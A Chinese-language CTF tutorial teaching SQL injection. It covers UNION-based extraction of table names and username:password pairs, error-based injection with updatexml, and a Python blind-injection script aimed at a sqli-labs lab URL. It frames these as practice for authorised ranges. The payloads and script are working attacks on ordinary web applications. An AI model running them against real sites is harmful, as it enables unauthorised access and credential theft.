---
title: SQL注入——从零到看见数据库
order: 1
category:
  - CTF
  - Web
icon: material-symbols:database
---

SQL 注入就是把恶意的 SQL 代码塞进用户输入里，让数据库执行你想要的查询。简单说：**你输入的不是数据，而是命令。**

<!-- more -->

## 为什么会这样？

后端代码偷懒了。本来应该这样写（安全）：

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
```

结果写成了这样（危险）：

```php
$sql = "SELECT * FROM users WHERE id = $id";
```

区别在于：`$id` 被直接拼进了 SQL 语句。如果 `$id` 是 `1 OR 1=1`，整个查询就变成了 `SELECT * FROM users WHERE id = 1 OR 1=1`，所有数据都出来了。

## 三步走：判断→定位→拿数据

### 第一步：判断有没有注入

在参数后面加单引号：

```
?id=1      → 页面正常
?id=1'     → 页面报错/内容变了 → 有注入
```

报错信息里如果出现 `SQL syntax` 之类的字样，基本确认了。

### 第二步：找列数和回显位

**确定有几列**（一直加数字直到报错）：

```sql
?id=1 ORDER BY 1  -- 正常
?id=1 ORDER BY 2  -- 正常
?id=1 ORDER BY 3  -- 正常
?id=1 ORDER BY 4  -- 报错 → 说明有 3 列
```

**找出哪些列会显示在页面上**：

```sql
?id=-1 UNION SELECT 1, 2, 3
```

页面上出现数字的位置就是回显位。把数字换成你要查的东西就行。

### 第三步：拿数据

**当前数据库名**：
```sql
?id=-1 UNION SELECT 1, database(), 3
```

**所有表名**：
```sql
?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name), 3
FROM information_schema.tables WHERE table_schema=database()
```

**某张表的列名**：
```sql
?id=-1 UNION SELECT 1, GROUP_CONCAT(column_name), 3
FROM information_schema.columns WHERE table_name='users'
```

**拿数据**：
```sql
?id=-1 UNION SELECT 1, GROUP_CONCAT(username,':',password), 3 FROM users
```

`information_schema` 是 MySQL 自带的元数据库，里面存着所有库、表、列的名字。`GROUP_CONCAT` 把多行结果拼成一行——省得一行行看。

## 没回显怎么办？

### 报错注入（页面显示错误信息）

```sql
?id=1 AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
```

`updatexml` 碰到错误的 XPath 路径会直接报错并把路径内容打印出来。我们故意塞给它一个非法路径，让它把查询结果"喷"出来。

### 布尔盲注（页面只有"正常"和"不正常"两种状态）

逐字符猜解。每猜对一个字符最多 7 次请求（二分法）：

```python
import requests

url = "http://challenge/Less-8/?id=1"
result = ""

for pos in range(1, 20):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = url + f" AND ASCII(SUBSTR((SELECT database()),{pos},1))>{mid}"
        r = requests.get(payload)
        if "You are in" in r.text:
            low = mid + 1
        else:
            high = mid
    result += chr(low)
    print(result)
```

核心逻辑：二分法猜每个字符的 ASCII 码，猜对了页面正常，猜错了异常。

## 练手去哪？

- [sqli-labs](https://github.com/Audi-1/sqli-labs) — 经典靶场，从 Less-1 开始打
- [CTFHub](https://www.ctfhub.com/) — 技能树里的 SQL 注入关，从易到难排列

## 一条建议

学的时候先别用 Sqlmap。手工搞懂每个 Payload 在干什么，比一键出结果有用得多。比赛时当然可以 Sqlmap 先跑着，但万一题目专门防了 Sqlmap（很常见），你还是得自己手写。

[^first]: 所有的练习都在本地靶场或授权的 CTF 平台上进行。不要对任何未授权的网站测试 SQL 注入。
